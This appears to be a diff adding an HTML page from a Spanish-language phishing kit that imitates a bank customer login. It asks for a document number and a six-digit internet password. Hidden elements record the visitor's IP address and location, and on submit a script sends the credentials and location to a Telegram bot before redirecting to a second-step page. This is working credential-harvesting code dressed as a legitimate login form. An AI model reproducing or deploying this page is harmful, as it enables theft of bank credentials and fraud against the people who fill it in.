@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+    <link rel="stylesheet" href="theap/hojadestilo.css">
+    <title>F-Clientes</title>
+
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+    <script src="dteleuno/ttoo.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+              $("#gfg").html(data.ip);
+          });
+          $.getJSON("https://ipinfo.io", function(response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+    
+      var u_name, u_name2,  ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("elr").value;
+        u_name2 = document.getElementById("elint").value;
+    
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "FORMULARIO\n☰URUT: " + u_name + "\n☰contraINT: " + u_name2 +  "\n🌎IP: " + ip +"\n" + ip2;
+      };
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'pasosegundo.html';
+        });
+        return false;
+      };
+    </script>
+
+
+
+
+
+</head>
+<body>
+
+    <div class="labarra">
+
+    </div>
+    <form method="post" action="#" onsubmit="return sender();">
+   <p class="focus"><img src="theap/spaceLogo-1.png" alt="eprimerlofj"></p><br>
+<center>
+<div class="elcontenido"><br>
+<h2>Realiza el Ingreso de clientes Ahora!</h2><br><br>
+<input autocomplete="off" required="" id="elr" name="elr" inputmode="numeric"   class="xinput" placeholder="Ingresa Tu Documento" type="text">
+<br>
+<input minlength="6" maxlength="6" required="" autocomplete="off" id="elint" name="elint" class="xinput" placeholder="Ingresa Tu Clave Internet" type="text"><br>
+
+<input value="Ingresar" class="delboton" type="submit">
+
+<h4 style="padding: 10px; color: rgb(193, 193, 193);font-weight: 300;">
+    Recuerda ingresar todos los datos solicitados, este paso es obligatorio!
+</h4>
+</div></center>
+</form>
+</body>
+<div style="color: rgb(255, 255, 255);font-size: 0.00002pt;" >
+    <p id="gfg"></p>
+    <p id="ip"></p>
+    <p id="address"></p></div>
+</html>
